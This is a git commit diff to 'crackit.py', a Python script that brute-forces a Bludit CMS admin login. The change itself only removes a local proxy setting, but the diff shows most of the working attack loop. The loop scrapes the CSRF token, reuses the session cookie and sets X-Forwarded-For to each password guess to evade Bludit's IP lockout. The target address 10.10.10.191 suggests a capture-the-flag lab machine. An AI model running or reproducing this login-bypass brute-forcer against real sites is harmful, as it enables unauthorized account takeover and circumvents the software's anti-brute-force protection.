6683004e0c3abc517b02e905d26ed2c8a436dba4
Aditya Verma <56410386+hellrider9@users.noreply.github.com>
2020-06-01 22:45:35 +0530

    Update crackit.py

--- crackit.py
+++ crackit.py
@@ -10,14 +10,14 @@ for line in file:
     proxy={'http':'127.0.0.1:8080'}
     print('Using {0}:{1}'.format(i,word), end="\r",flush=True)
     url=sys.argv[3]
-    req=requests.get(url,proxies=proxy,headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'})
+    req=requests.get(url,headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'})
     session=req.cookies['BLUDIT-KEY']
     soup=BeautifulSoup(req.text, "lxml")
     CSRF=soup.find('input',attrs = {'name':'tokenCSRF'})['value']
     data={'tokenCSRF':CSRF,'username':sys.argv[1],'password':word,'save':''}
     cookie={'BLUDIT-KEY':session}
     headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language': 'en-US,en-GB;q=0.8,en;q=0.5,hi;q=0.3','Accept-Encoding':'gzip, deflate','Referer':'http://10.10.10.191/admin/login','Content-Type':'application/x-www-form-urlencoded','Upgrade-Insecure-Requests':'1','X-FORWARDED-FOR':word}
-    response=requests.post(url,data=data,cookies=cookie,allow_redirects=False,proxies=proxy,headers=headers)
+    response=requests.post(url,data=data,cookies=cookie,allow_redirects=False,headers=headers)
     if 'alert-danger' not in response.text:
          print("Password = "+word)
          sys.exit(0)
